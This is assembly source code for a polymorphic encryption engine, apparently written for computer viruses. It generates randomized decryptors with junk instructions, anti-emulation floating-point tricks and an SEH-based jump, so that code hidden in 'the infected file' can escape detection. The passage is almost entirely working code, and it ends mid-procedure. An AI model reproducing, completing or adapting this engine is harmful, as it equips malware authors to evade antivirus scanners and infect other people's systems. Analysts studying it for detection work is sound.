;            ┌─╥─────────────────────────────────────────────╥─┐
;            ┌─╥─────────────────────────────────────────────╥─┐
;            │┌╫┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╫┐│
;            ╞╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╡
;            │├╫┼╫┼╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┼╫┼╫┤│
;            │╞╬╪╬╡ ind00r poly engine (ipe32) v1.0 final ╞╬╪╬╡│
;            │├╫┼╫┼───────────────────────────────────────┼╫┼╫┤│
;            │╞╬╪╬╡                                       ╞╬╪╬╡│
;            │├╫┼╫┤          04.01.01 ├─┤ by slurp        ├╫┼╫┤│
;            │╞╬╪╬╡                                       ╞╬╪╬╡│
;            │├╫┼╫┼╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┼╫┼╫┤│
;            ╞╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╡
;            │└╫┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╫┘│
;            └─╨─────────────────────────────────────────────╨─┘
;
%define RANDOM_SEED      0x0BABA * 65536 + 0x0BABE
%define MAX_POLY_SIZE    3072

; procedure number constantz
%define LOAD_POINTER     0x00
%define LOAD_COUNTER     0x01
%define LOAD_KEY         0x02
%define DECRYPT_DATA     0x03
%define INC_KEY          0x04               ; increment key
%define INC_POINTER      0x05               ; increment pointer by 4
%define DEC_COUNTER      0x06               ; decrement counter by 1
%define FPU_FOOL         0x07               ; some anti emulatin' stuff
%define JUNK_PROC        0x08
%define MAX_PROCS        JUNK_PROC + JUNK_PROCS + 1
%define MIN_PROCS        JUNK_PROC + 1
%define JUNK_PROCS       0x04               ; maximal junk procedure count - 1

%define MAX_PARAMS       0x04               ; maximal number of parameters

%define GF_METHCNT       3
%define BJ_BLOCKCNT      0x05
%define RJ_METHCNT       0x06
%define MJ_METHCNT       0x03
%define GM_METHCNT3      0x02
%define GM_METHCNT2      0x03
%define GM_METHCNT1      0x05
%define PP_METHCNT       0x05
%define GLR_METHCNT      0x04
%define JUNKGEN_CNT      0x02
%define CALL_ORDER_1     CallOrder1_e - CallOrder1
%define CALL_ORDER_2     CallOrder2 - CallOrder1
%define PROC_ORDER       ProcedureOrder_e - ProcedureOrder

%define USED_REGS        Registers_e - Registers

; encryption type constantz
%define ENC_XOR        0b00000000             ; xor encryption
%define ENC_ADD        0b00000001             ; add encryption
%define ENC_SUB        0b00000010             ; sub encryption
%define ENC_ROL        0b00000011             ; rol encryption
%define ENC_ROR        0b00000100             ; ror encryption
%define ENC_RND        5

; key increment type constantz
%define KEY_INC        0b00000000             ; rol key with random value
%define KEY_DEC        0b00000001             ; ror key with random value
%define KEY_ROL        0b00000010             ; inc key with random value
%define KEY_ROR        0b00000011             ; dec key with random value
%define KEY_RND        4
; i386 instruction set constants
; correct order of register on stack after a pushad. offset relative
; to ESP
%define PUSHAD_EAX       (REG_EDI - REG_EAX) * 4      ; location of EAX
%define PUSHAD_ECX       (REG_EDI - REG_ECX) * 4      ; location of ECX
%define PUSHAD_EDX       (REG_EDI - REG_EDX) * 4      ; location of EDX
%define PUSHAD_EBX       (REG_EDI - REG_EBX) * 4      ; location of EBX
%define PUSHAD_ESP       (REG_EDI - REG_ESP) * 4      ; location of ESP
%define PUSHAD_EBP       (REG_EDI - REG_EBP) * 4      ; location of EBP
%define PUSHAD_ESI       (REG_EDI - REG_ESI) * 4      ; location of ESI
%define PUSHAD_EDI       (REG_EDI - REG_EDI) * 4      ; location of EDI
%define PUSHAD_SIZE      8 * 0x04                      ; size of pushad record

; dword registerz
%define REG_EAX          0b00000000
%define REG_ECX          0b00000001
%define REG_EDX          0b00000010
%define REG_EBX          0b00000011
%define REG_ESP          0b00000100
%define REG_EBP          0b00000101
%define REG_ESI          0b00000110
%define REG_EDI          0b00000111

; word registerz
%define REG_AX           0b00000000
%define REG_CX           0b00000001
%define REG_DX           0b00000010
%define REG_BX           0b00000011
%define REG_SP           0b00000100
%define REG_BP           0b00000101
%define REG_SI           0b00000110
%define REG_DI           0b00000111

; byte registerz
%define REG_AL           0b00000000
%define REG_CL           0b00000001
%define REG_DL           0b00000010
%define REG_BL           0b00000011
%define REG_AH           0b00000100
%define REG_CH           0b00000101
%define REG_DH           0b00000110
%define REG_BH           0b00000111

; fpu registerz
%define REG_ST0          0b00000000
%define REG_ST1          0b00000001
%define REG_ST2          0b00000010
%define REG_ST3          0b00000011
%define REG_ST4          0b00000100
%define REG_ST5          0b00000101
%define REG_ST6          0b00000110
%define REG_ST7          0b00000111

%define REG_RND          REG_EDI + 1

; jump opcode constantz
%define JMP_SHORT        0x0EB
%define JMP_LONG         0x0E9
%define JMPC_SHORT       0x070
%define JMPC_LONG        0x080              ; 2 byte opcode!

; conditions

%define COND_C           0x002            ; carry
%define COND_NC          0x003            ; no carry
%define COND_E           0x004            ; equal                   A  = B
%define COND_NE          0x005            ; not equal               A != B
%define COND_Z           0x004            ; zero                    A  = B
%define COND_NZ          0x005            ; not zero                A != B
%define COND_S           0x008            ; sign                   msb = 1
%define COND_NS          0x009            ; no sign                msb = 0
%define COND_P           0x00A            ; parity even            lsb = 0
%define COND_O           0x000            ; overflow       msb was toggled
%define COND_NO          0x001            ; no overflow    msb wasn't toggled

%define COND_B           COND_C          ; below                    A > B
%define COND_NAE         COND_B          ; neither above or equal   A > B
%define COND_NB          COND_NC         ; not below                A ≤ B
%define COND_AE          COND_NB         ; above or equal           A ≤ B
%define COND_BE          0x006            ; below or equal           A ≥ B
%define COND_NA          COND_BE         ; not above                A ≥ B
%define COND_NBE         0x007            ; neither below or equal   A < B
%define COND_A           COND_NBE        ; above                    A < B
%define COND_L           0x00C            ; less                     A > B
%define COND_NGE         COND_L          ; neither greater or equal A > B
%define COND_NL          0x00D            ; not less                 A ≤ B
%define COND_GE          COND_NL         ; greater or equal         A ≤ B
%define COND_LE          0x00E            ; less or equal            A ≥ B
%define COND_NG          COND_LE         ; not greater              A ≥ B
%define COND_NLE         0x00F            ; neither less or equal    A < B
%define COND_G           COND_NLE        ; greater                  A < B

; call opcode constantz
%define CALL_DIRECT      0x0E8

; procedure commands
%define PROC_ENTER       0x0C8
%define PROC_LEAVE       0x0C9
%define PROC_RETP        0x0C2
%define PROC_RET         0x0C3
%define MOV_EBP_ESP      0x0EC8B

; stack opcodes
%define PUSH_REG         0x050                 ; xor REG_???
%define POP_REG          0x058
%define PUSH_IMM         0x068
%define PUSH_IMM_SX      0x06A
%define POP_MEM          0x08F

; increment/decrement opcodes
%define INC_REG          0x040
%define DEC_REG          0x048
%define INCDEC_GROUP     0x0FE

; mov opcodes
%define MOV_REG_RM       0
%define MOV_REG_IMM      0x0B0 ; mov register, immediate
%define MOV_REG_IMM8     0x0B0
%define MOV_REG_IMM32    0x0B8
%define MOV_MEM_IMM      0x0C6 ; mov memory, immediate

; extended mov opcodes

%define MOVX             0x0B6
%define MOVX_BYTE        0x000
%define MOVX_WORD        0x001
%define MOVX_ZX          0x000
%define MOVX_SX          0x008

%define LOAD_EA          0x08D

; Flag set/clear commands
%define CLR_CRY          0x0F8
%define SET_CRY          0x0F9
%define CLR_INT          0x0FA
%define SET_INT          0x0FB
%define CLR_DIR          0x0FC
%define SET_DIR          0x0FD

; Common opcode constants

; prefixes
%define ESC_2BYTE        0x0F
%define OPERAND_SIZE     0x66
%define ADDRESS_SIZE     0x67

; segment override prefix
%define OVERRIDE_FS      0x64
%define OVERRIDE_GS      0x65

; operand size
%define OPSIZE_8         0x00
%define OPSIZE_32        0x01
%define OPSIZE_16        0x02

; direction
%define MEM_REG          0x00
%define REG_MEM          0x01

; some opcodes support direct EAX/AX/AL access
%define USE_EAX          0x04
%define XCHG_EAX_REG     0x090 ; add register number to get opcode (not eax)
%define OP_NOP           0x090 ; very obsolete :x<
%define TEST_EAX_IMM     0x0A8

; Shift operation constants
%define OP_SHIFT         0x0C0

%define SHIFT_IMM        0x000 ; shift immediate
%define SHIFT_1          0x001 ; shift 1 time
%define SHIFT_CL         0x002 ; shift cl times
%define SHIFT_RND        0x003 ; for choosing random shift.

%define ROL_SHIFT        0x000
%define ROR_SHIFT        0x001
%define RCL_SHIFT        0x002
%define RCR_SHIFT        0x003
%define SHL_SHIFT        0x004
%define SHR_SHIFT        0x005
%define SAR_SHIFT        0x006
%define RND_SHIFT        0x007

%define OP_GROUP1        0x080 ; opcode for immediate group 1
%define OP_GROUP3        0x0F6 ; opcode for shift group 3

; jmp, call, push, inc, dec group
%define OP_GROUP5        0x0FF ; opcode for jmpcallpushincdec group 5

%define P_INC            0x000
%define P_DEC            0x001
%define P_CALL_NEAR      0x002  ; call dword ptr
%define P_CALL_FAR       0x003  ; call 48-bit ptr
%define P_JMP_NEAR       0x004  ; jmp dword ptr
%define P_JMP_FAR        0x005  ; jmp 48-bit ptr
%define P_PUSH           0x006

; Math operation constants
%define OPTYPE_ADD       0x00
%define OPTYPE_OR        0x01
%define OPTYPE_ADC       0x02
%define OPTYPE_SBB       0x03
%define OPTYPE_AND       0x04
%define OPTYPE_SUB       0x05
%define OPTYPE_XOR       0x06
%define OPTYPE_CMP       0x07
%define OPTYPE_MOV       0x008
%define OPTYPE_TEST      0x009
%define OPTYPE_XCHG      0x00A

; Math opcode constants
%define MATH_ADD         OPTYPE_ADD << 0x03
%define MATH_OR          OPTYPE_OR  << 0x03
%define MATH_ADC         OPTYPE_ADC << 0x03
%define MATH_SBB         OPTYPE_SBB << 0x03
%define MATH_AND         OPTYPE_AND << 0x03
%define MATH_SUB         OPTYPE_SUB << 0x03
%define MATH_XOR         OPTYPE_XOR << 0x03
%define MATH_CMP         OPTYPE_CMP << 0x03

; Immediate opcode constants
%define IMM_OP           0x80
%define IMM_SX           0x03               ; sign extended immediate

; MOD/RM constants

; MOD bits
%define MOD_NODISP       0x000                  ; no displacement
%define MOD_DISP8        0x040                  ; 8-bit displacement
%define MOD_DISP32       0x080                  ; 32-bit displacement
%define MOD_REG          0x0C0                  ; register
%define _MOD             0b011000000            ; mask for MOD-field

%define MOD_DIRECT       0b00001000                 ; use immediate address
%define MOD_SIB          0b00010000                 ; use sib byte

; REG bits
%define _REG             0b000111000            ; mask for REG-field

; RM bits
%define RM_DIRECT        REG_EBP ^ MOD_NODISP
%define RM_SIB           REG_ESP
%define _RM              0b000000111            ; mask for RM field

; FPU opcodes

%define FPU_OPCODE       0x0D8
%define FPU_DWORD_OP     0x0D8   ; dword ops/fpu reg ops
%define FPU_DWORD_LDST   0x0D9   ; group 1 - 4, FLD, FST, ...
%define FPU_INT_OP       0x0DA   ; dword operations
%define FPU_INT_LDST     0x0DB   ; group 5, FILD, FIST
%define FPU_QWORD_OP     0x0DC   ; qword ops/fpu reg ops
%define FPU_QWORD_LDST   0x0DD   ; qword FILD, FIST
%define FPU_WORD_OP      0x0DE   ; word ops (only mem), and reversed arithmetix
%define FPU_WORD_LDST    0x0DF   ; word FILD, FIST

; FPU opcode + MOD/RM (bl = FPU_FMUL, FDIV...)

; IMPORTANT: note that the word operations won't work with fpu registers!

%define FPU_ADD         0b000                   ; MOD/RM bit 3,4,5 = 001
%define FPU_MUL         0b001
%define FPU_CMP         0b010
%define FPU_COMP        0b011
%define FPU_SUB         0b100
%define FPU_SUBR        0b101
%define FPU_DIV         0b110
%define FPU_DIVR        0b111

; FPU_WORD_OP group contains some opcodes with reversed register order.
; this means first comes st(?) and then the first register.
%define FPU_ADDP        0b000                   ; MOD/RM bit 3,4,5 = 001
%define FPU_MULP        0b001
%define FPU_COMPP       0b011
%define FPU_SUBRP       0b100
%define FPU_SUBP        0b101
%define FPU_DIVRP       0b110
%define FPU_DIVP        0b111

%define FPU_DIR1         0x000                     ; direction st, st(?)
%define FPU_DIR2         0x004                     ; direction st(?), st

; FPU stand alone instructions
%define FPU_INIT         0x0E3DB
%define FPU_SQRT         0x0FAD9

%define FPU_LD1          0x0E8D9
%define FPU_LDL2T        0x0E9D9
%define FPU_LDL2E        0x0EAD9
%define FPU_LDPI         0x0EBD9
%define FPU_LDLG2        0x0ECD9
%define FPU_LDLN2        0x0EDD9
%define FPU_LDZ          0x0EED9

%define FPU_WAIT         0x09B
%define FPU_STORE        0x02
%define FPU_LOAD         0x00


; main procedure: ind00r
; parameters:
;
;                EAX  = size of junk space (in dwords)
;                EDX  = address of junk space
;                ────────┐ this is the RVA of an empty space in (un-
;                         initialized data or padding space). the junk
;                         instructions will write to this area
;                        └──────────────────────────────────────────
;
;                EBX  = address of code to decrypt
;                ────────┐ this is the RVA where the encrypted
;                         code will be stored in the infected file.
;                        └──────────────────────────────────────────
;
;                ECX  = size of code to encrypt (in dwords)
;                ESI ─ code to encrypt
;                EDI ─ area >= 2kb to store the decryptor
;
; returns:       the registers aren't changed except ECX that contains
;                the size of the poly decryptor!
;
; NOTE: '─' is equal to 'points to'
;
; the decryptor constists of junk procedures, decryptor procedures, main
; loop calling the procedures and finally jump to the start address to the
; decrypted code.
ind00r:
                push  eax                        ; preserve all registers
                push  ecx
                push  edx
                push  ebx
                push  ebp
                push  esi
                push  edi
 
                call  iInit                      ; initialize poly engine
ind00r_delta:   mov   al, JMP_LONG               ; write jump to main loop
                stosb                            ; store opcode
                push  edi                        ; to reloc jmp l8er
                stosd                            ; store relative offset
                call  WriteJunk                  ; write some junk bytez
                call  iGenProcs                  ; generate procedures
                push  edi                        ; here we want to jump
                call  RelLongJmp                 ; reloc jump to main loop
                or    byte [ebp+nojunk-idelta], 0x0FF
                call  iGenLoop                   ; generate main loop
                call  iSEHJump
                sub   edi, [esp+PUSHAD_EDI]      ; calculate decryptor size
                mov   [esp+PUSHAD_ECX], edi      ; ECX = size
                call  iEncrypt                   ; encrypt code!
                pop  edi                         ; restore all registers
                pop  esi
                pop  ebp
                pop  ebx
                pop  edx
                pop  ecx
                pop  eax
                ret                              ; return
;ind00r          endp
; main procedure: init
iInit:
                ; first of all, calculate new delta offset
                mov   ebp, [esp]
                add   ebp, idelta - ind00r_delta        ; calculate delta
                                                        ; offset
                ; now init random seed
                push  dword [ebp+RandomConst-idelta]
                pop   dword [ebp+RandomSeed-idelta]

                push  edi                   ; push destination index
                lea   edi, [ebp+InitValues-idelta] ; table with init values

                ; let's store parameterz
                stosd                       ; store size of junk space
                xchg  eax, edx
                stosd                       ; store address of junk space
                xchg  eax, ebx
                stosd                       ; store decrypt rva
                xchg  eax, ecx
                stosd                       ; size of code
                xchg  eax, esi
                stosd                       ; address of code

                ; mix the registers
                lea   esi, [ebp+preg-idelta]
                push  USED_REGS
                call  MixBytes

                ; get number of junk procedures (1 - 5)
                push  JUNK_PROCS      ; 0 - 3
                call  rnd32r
                add   al, MIN_PROCS
                mov   [ebp+ProcCount-idelta], al   ; number of procedures

                ; put the procedures in random order
                lea   esi, [ebp+ProcedureOrder-idelta]
                push  eax
                call  MixBytes

                ; put procedure calls in random order
                lea   esi, [ebp+CallOrder1-idelta]
                push  CALL_ORDER_1
                call  MixBytes

                lea   esi, [ebp+CallOrder2-idelta]
                mov   ecx, eax
                sub   al, CALL_ORDER_2 + 1
                push  eax
                call  MixBytes

                ; get random parameter count for each procedure
                lea   edi, [ebp+ProcParameters-idelta]
                mov   cl, MAX_PROCS
i_par_loop:     push  MAX_PARAMS + 0x03       ;   0 - MAX_PARAMS + 2
                call  rnd32r
                sub   al, 0x02
                jnc   i_lamest
                xor   eax, eax
i_lamest:       stosb
                loop  i_par_loop
                xor   eax, eax
                stosb

                ; get random key, encryption & key increment type
                lea   edi, [ebp+CryptKey-idelta]
                call  rnd32
                stosd                        ; write key
                call  rnd32
                stosd                        ; write key increment
                push  ENC_RND
                call  rnd32r
                stosb                        ; write encryption type
                push  KEY_RND
                call  rnd32r
                stosb                        ; write key increment type
                pop   edi                    ; pop destination index
                and   word [ebp+InLoop-idelta], 0x00
                ret
;iInit           endp
; main procedure: encrypt
iEncrypt:
                pushad
                lea   esi, [ebp+CryptSize-idelta]
                lodsd                   ; CryptSize
                xchg  eax, ebx
                lodsd                   ; EncryptRVA
                xchg  eax, edi
                lodsd                   ; CryptKey
                xchg  eax, ecx
                lodsd                   ; KeyIncrement
                xchg  eax, edx

encrypt_loop:   mov   al, [ebp+CryptType-idelta] ; get encryption type
                cmp   al, ENC_XOR         ; XOR encryption?
                jnz   ie_not_xor          ; no, check next
                xor   [edi], ecx          ; yes, XOR [preg], key
ie_not_xor:     cmp   al, ENC_ADD         ; ADD decryption?
                jnz   ie_not_add          ; no, check next
                sub   [edi], ecx          ; yes, SUB [preg], key
ie_not_add:     cmp   al, ENC_SUB         ; SUB decryption?
                jnz   ie_not_sub          ; no, check next
                add   [edi], ecx          ; yes, ADD [preg, key
ie_not_sub:     cmp   al, ENC_ROL         ; ROL decryption?
                jnz   ie_not_rol          ; no, check next
                ror   dword [edi], cl ; rotate dword
ie_not_rol:     cmp   al, ENC_ROR         ; ROR decryption?
                jnz   ie_not_ror          ; no, jmp to key increment
                rol   dword [edi], cl ; rotate dword
ie_not_ror:     xchg  ecx, edx
                mov   al, [ebp+KeyIncType-idelta] ; get key increment type
                cmp   al, KEY_ROL         ; ROL key increment?
                jnz   ie_n_rol            ; no, check next
                rol   edx, cl             ; rotate key
ie_n_rol:       cmp   al, KEY_ROR         ; ROR key increment?
                jnz   ie_n_ror            ; no, check next
                ror   edx, cl             ; rotate key
ie_n_ror:       cmp   al, KEY_INC         ; ADD key increment?
                jnz   ie_n_inc            ; no, check next
                add   edx, ecx            ; increment key
ie_n_inc:       cmp   al, KEY_DEC         ; SUB key increment?
                jnz   ie_n_dec            ; no
                sub   edx, ecx            ; decrement key
ie_n_dec:       xchg  ecx, edx
                scasd                     ; increment pointer by 4
                dec   ebx
                jnz   encrypt_loop
                popad
                ret
;iEncrypt        endp
; main generator: generate procedure body and some junk around the real
;                 instructions.
iGenProcs:
                ; get number of procedures into counter
                movzx ecx, byte [ebp+ProcCount-idelta]
                xor   ebx, ebx  ; set up another counter that counts from 0

                ; for choosin' procedures
                call  rnd32
                xchg  dh, al

gp_loop:        push  ecx
                ; getting number of current procedure
                push  ebx
                movzx ebx, byte [ebp+ProcedureOrder-idelta+ebx]
                                                    ; ID # of 1st procedure
                mov   [ebp+CurrentProc-idelta], bl  ; for junk gen to
                                                    ; identify current:
                ; store procedure address
                mov   [ebp+ProcAddress-idelta+4*ebx], edi

                ; get number of parameters
                mov   dl, [ebp+ProcParameters-idelta+ebx]
                test  dl, dl                  ; if no parameter,
                jz    gp_np_entry             ; generate no entry
                ; if procedure has parameters we need to set up EBP
                ; choose between two (similar) entrys:
                ;       ENTER 0x0000,0x00
                ;             or
                ;       PUSH  EBP
                ;       MOV   EBP, ESP
                test  dh, 0x01
                jz    gp_psh_entry
                xor   eax, eax                ; no local variables
                mov   al, PROC_ENTER          ; opcode for enter
                stosd                         ; store instruction
                jmp   gp_np_entry
gp_psh_entry:   mov   eax, PUSH_REG | REG_EBP | (0x100 * MOV_EBP_ESP)
                stosd
                dec   edi                     ; wrote 3 bytes
gp_np_entry:    push  ebx
                call  iProcJunk
                pop   ebx
                cmp   ebx, JUNK_PROC
                jnb   gp_junk_proc
                mov   esi, [ebp+Generatorz-idelta+ebx*4]
                add   esi, ebp
                push  edx
                call  esi                     ; call di generator
                pop   edx
gp_junk_proc:   call  iProcJunk               ; make some junk

                mov   eax, edx
                xor   ah, ah
                shl   eax, 0x08 ^ 0x02        ; shift left one byte + * 4
                xor   al, PROC_RETP           ; generate ret (with params)
                test  ah, ah                  ; do we have parameters?
                jz    gp_no_par

                mov   byte [edi], POP_REG | REG_EBP
                test  dh, 0x01
                jz    gp_psh_exit
                xor   byte [edi], PROC_LEAVE ^ (POP_REG | REG_EBP)
gp_psh_exit:    inc   edi                       ; write pop ebp/leave

                stosd                           ; store RET opcode (0xC2)
                dec   edi                       ; only store 3 bytes
                jmp   gp_par
gp_no_par:      inc   eax
                stosb                           ; store RET opcode (0xC3)

gp_par:         call  WriteJunk

                pop   ebx
                inc   ebx                       ; increment count
                pop   ecx
%ifdef NO_SHORT_JMP
                dec   ecx
                jz    gp_loop_short
                jmp   gp_loop
gp_loop_short:  
%else              
                loop  gp_loop
%endif
                ret
;iGenProcs       endp
; generates main loop with some junk between callz.
iGenLoop:
                or    byte [ebp+InLoop-idelta], 0x01
                lea   esi, [ebp+CallOrder1-idelta]
                movsx ecx, byte [ebp+ProcCount-idelta]
                or    byte [ebp+CurrentProc-idelta], 0x0FF
gl_call_lp:     xor   eax, eax
                lodsb                           ; get numbah of:
                xchg  eax, ebx
                inc   byte [ebp+CurrentProc-idelta]
                cmp   byte [ebp+CurrentProc-idelta], DECRYPT_DATA
                jne   gl_yxcmv
                push  edi
gl_yxcmv:
                push  ecx
                movsx ecx, byte [ebp+ProcParameters-idelta+ebx]
                push  ebx
                test  ecx, ecx                  ; 0 parameterz?
                jz    gl_no_par                 ; don't loop
gl_push_lp:
                call  iPushJunk
                loop  gl_push_lp
gl_no_par:
                pop   ebx
                mov   edx, [ebp+ProcAddress-idelta+4*ebx]
                mov   byte [edi], CALL_DIRECT ; write call opcode
                inc   edi
                neg   edi
                lea   eax, [edx+edi-0x04]
                neg   edi
                stosd
                pop   ecx                       ; outer loop counter
                loop  gl_call_lp
                mov   bl, [ebp+creg-idelta]    ; generate check if counter
                call  gCheckReg                ; reg is zero
                mov   ax, ESC_2BYTE ^ ((JMPC_LONG ^ COND_NE) * 0x100)
                stosw                            ; generate JNZ
                pop   eax
                neg   edi
                lea   eax, [eax+edi-0x04]         ; eax = eax - (edi + 0x04)
                neg   edi
                stosd                            ; store jump offset
                ret
;iGenLoop        endp
; generate jump to code
iSEHJump:
                mov   edx, [ebp+DecryptRVA-idelta] ; where to jump after
                                                   ; decryption

                ; 1. let's put offset to code on stack

                call  rnd32
                test  al, 0x01
                jz    isj_npd

                ; generate PUSH offset CODE
                mov   al, PUSH_IMM                 ; push 32-bit immediate
                stosb
                xchg  eax, edx
                stosd                              ; immediate value
                jmp   isj_npd0

                ; load reg with value and push reg
isj_npd:        call  rnd32
                and   al, REG_EDI
                cmp   al, REG_ESP
                je    isj_npd
                xchg  eax, ebx
                push  ebx
                call  gLoadReg
                pop   eax
                xor   al, PUSH_REG
                stosb

                ; 2. let's clear a reg to index fs:[0]

isj_npd0:       ; get a random register & clear it
                call  rnd32
                and   al, REG_EDI
                cmp   al, REG_ESP
                je    isj_npd0
                mov   ebx, eax
                call  gClearReg
                xchg  eax, ecx

                ; 3. put da old handler on stack

                mov   al, OVERRIDE_FS
                stosb
                xor   ch, ch
                xor   esi, esi
                call  rnd32
                test  al, 0x01
                jz    isj_dir
                mov   bh, OPTYPE_MOV
                call  rnd32
                and   al, 0x02
                add   bh, al
isj_gnr:        call  rnd32
                and   al, REG_EDI
                cmp   al, cl
                je    isj_gnr
                mov   bl, al
                mov   al, OPSIZE_32
                mov   ah, REG_MEM
                call  ciOpRMReg
                xchg  eax, ebx
                xor   al, PUSH_REG
                stosb
                jmp   isj_dir0
isj_dir:        mov   al, OP_GROUP5
                stosb
                mov   bl, P_PUSH
                call  ciCreateOperand
isj_dir0:
                ; 4. now set new handler to ESP

                mov   al, OVERRIDE_FS
                stosb
                mov   bx, REG_ESP ^ (OPTYPE_MOV * 0x100)
                mov   ax, OPSIZE_32 ^ (MEM_REG * 0x100)
                call  ciOpRMReg

                ; 5. let's create some junk that causes exception

                push  0x03
                pop   ecx
ex_junk_loop:   push  ecx
                push  OPTYPE_CMP
                call  rnd32r
                xchg  eax, ebx
                call  rnd32
                test  al, 0x01
                jz    isj_suck
                mov   bh, bl
                call  rnd32
                and   al, REG_EDI
                mov   bl, al
                push  0x03
                call  rnd32r
                mov   ah, MEM_REG
                call  ciOpRMReg
                jmp   isj_suck0
isj_suck:       call  rnd32
                xchg  eax, edx
                push  0x03
                call  rnd32r
                call  ciOpRMImm

isj_suck0:      pop   ecx
                loop  ex_junk_loop
                ret
;iSEHJump        endp
; load start RVA into pointer register
iProcLdPtr:
                mov   edx, [ebp+DecryptRVA-idelta]
                mov   bl, [ebp+preg-idelta]
                jmp   gLoadReg
;iProcLdPtr      endp
; load size into counter register
iProcLdCnt:
                mov   edx, [ebp+CryptSize-idelta]
                mov   bl, [ebp+creg-idelta]
                jmp   gLoadReg
;iProcLdCnt      endp
; load key into key register
iProcLdKey:
                mov   edx, [ebp+CryptKey-idelta]
                mov   bl, [ebp+kreg-idelta]
                jmp   gLoadReg
;iProcLdKey      endp
; decrypt data word
iProcDecData:
                mov   cl, [ebp+preg-idelta]  ; operand = ptr reg
                call  rnd32                  ; get random bit
                mov   bl, 0x08
                cmp   byte [ebp+CryptType-idelta], ENC_SUB
                jbe   dd_not_chk_ecx
                cmp   cl, REG_ECX
                jne   dd_not_chk_ecx
                or    al, 0x01                ; set 1st bit
dd_not_chk_ecx:
                test  al, 0x01            ; is it zero?
                jz    blaaah             ; yes, use direct encryption

                ; create MOV/XCHG junkreg, [preg] (indirect encryption)

dd_get_jnk_reg: call  iGetJunkReg
                cmp   al, REG_ECX            ; is it ECX?
                je    dd_get_jnk_reg         ; yes, use other junk reg
                mov   bl, al
                xor   al, MOD_REG
                push  eax                    ; push code reg for later use
                mov   bh, OPTYPE_MOV         ; generate MOV
                call  rnd32                  ; random numbah
                and   al, 0x02
                add   bh, al                 ; zero, use MOV
                                             ; non-zero, use XCHG
                xor   esi, esi               ; no displacement
                mov   al, OPSIZE_32          ; dword, of course
                mov   ah, REG_MEM            ; from memory to register
                call  ciOpRMReg
                pop   ecx
                call  iBlockJunkAR
blaaah:
                ; test for encryption type
                mov   al, [ebp+CryptType-idelta]
                cmp   al, ENC_XOR
                jnz   dd_not_xor
                mov   bh, OPTYPE_XOR   ; generate XOR jreg/[preg], kreg
dd_not_xor:     cmp   al, ENC_ADD
                jnz   dd_not_add
                mov   bh, OPTYPE_ADD   ; generate ADD jreg/[preg], kreg
dd_not_add:     cmp   al, ENC_SUB
                jnz   dd_not_sub
                mov   bh, OPTYPE_SUB   ; generate SUB jreg/[preg], kreg

dd_not_sub:     ja    dd_rotate        ; generate ROR/ROL jreg/[preg], kreg
                push  ecx
                mov   al, OPSIZE_32
                mov   ah, MEM_REG
                mov   bl, [ebp+kreg-idelta]
                xor   ch, ch
                xor   esi, esi
                call  ciOpRMReg
                jmp   dd_exit


dd_rotate:      push  ecx              ; code reg/pointer reg
                push  eax
                push  ecx

                ; we'll generate
                ;
                ; shift on [preg]:
                ;
                ;    push  ecx                 (only if kreg <> ECX)
                ;    mov   ecx, kreg           (  "  "    "   "  " )
                ;    ror   [preg], cl          (rol/ror)
                ;    pop   ecx                 (only if kreg <> ECX)
                ;
                ;
                ; shift on junkreg:  (this variant is forced if preg = ECX)
                ;
                ;    mov   junkreg, [preg]     (xchg/mov)
                ;    push  ecx                 (only if kreg <> ECX)
                ;    mov   ecx, kreg
                ;    ror   junkreg, cl         (rol/ror)
                ;    pop   ecx
                ;    mov   [preg], junkreg     (xchg/mov)
                ;
                ; junkreg must not be ECX

                mov   al, [ebp+kreg-idelta]    ; load key register

                cmp   al, REG_ECX              ; ECX?
                jz    dd_no_push               ; yes, no need to push ecx

                or    al, MOD_REG
                xchg  eax, ecx

                push  REG_ECX
                call  iIsJReg
                cmp   eax, 0xFFFFFFFF
                jnz   dd_ecx_isj

                mov   al, PUSH_REG ^ REG_ECX   ; generate PUSH ECX
                stosb                          ; store opcode
                pop   ebx
                call  iBlockJunkAR
                push  ebx
dd_ecx_isj:     xchg  eax, edx

                mov   bx, REG_ECX ^ (OPTYPE_MOV * 0x100) ^ MOD_REG
                call  rnd32
                mov   al, OPSIZE_32
                and   ah, REG_MEM
                jnz   dd_nxchg
                xchg  bl, cl
dd_nxchg:
                call  ciOpRMReg                ; generate mov ecx, kreg

dd_askdjh:      call  iGetJunkReg
                pop   ebx
                push  ebx
                and   ebx, REG_EDI
                cmp   eax, ebx
                je    dd_askdjh
                cmp   al, REG_ECX
                je    dd_askdjh
                xchg  eax, ebx
                call  iRndJunk
dd_no_push:
                pop   ecx
                pop   eax

                mov   bl, ROR_SHIFT            ; shift type ROR
                cmp   al, ENC_ROR              ; is it ROR?
                jz    dd_enc_ror               ; yes, skip
                dec   ebx                      ; decrement shift type (ROL)
dd_enc_ror:
                mov   al, OPSIZE_32
                mov   bh, SHIFT_CL
                xor   ch, ch                   ; no SIB addressin'
                xor   esi, esi
                call  ciShiftRM

                xchg  eax, edx
                cmp   al, PUSH_REG ^ REG_ECX
                jnz   dd_no_pop
                pop   ebx
                push  ebx
                and   ebx, REG_EDI
                call  iBlockJunkAR
                xor   al, PUSH_REG ^ POP_REG
                stosb
dd_no_pop:

dd_exit:        pop   ebx                      ; pop code/ptr reg
                mov   eax, ebx
                and   al, MOD_REG
                xor   al, MOD_REG
                jnz   dd_not_save_reg
                and   ebx, REG_EDI
                call  iBlockJunkAR
                mov   cl, [ebp+preg-idelta]
                mov   bh, OPTYPE_MOV
                call  rnd32
                and   al, 0x02
                add   bh, al
                mov   ax, OPSIZE_32 | (MEM_REG * 0x100)
                xor   ch, ch
                xor   esi, esi
